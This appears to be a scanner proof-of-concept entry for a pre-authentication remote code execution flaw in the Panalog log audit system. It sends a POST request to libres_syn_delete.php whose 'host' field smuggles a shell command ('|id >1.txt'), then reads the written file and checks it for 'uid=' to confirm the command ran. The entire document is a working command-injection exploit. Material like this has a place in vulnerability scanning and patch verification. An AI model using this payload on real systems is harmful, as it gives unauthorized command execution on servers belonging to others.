{
        'name': 'Panalog 日志审计系统 libres_syn_delete.php 前台RCE漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/content-apply/libres_syn_delete.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip',
                'Connection': 'close'
            },
            'data': """token=1&id=2&host=|id >1.txt""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/content-apply/1.txt',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'uid='
        }}
        ]
    }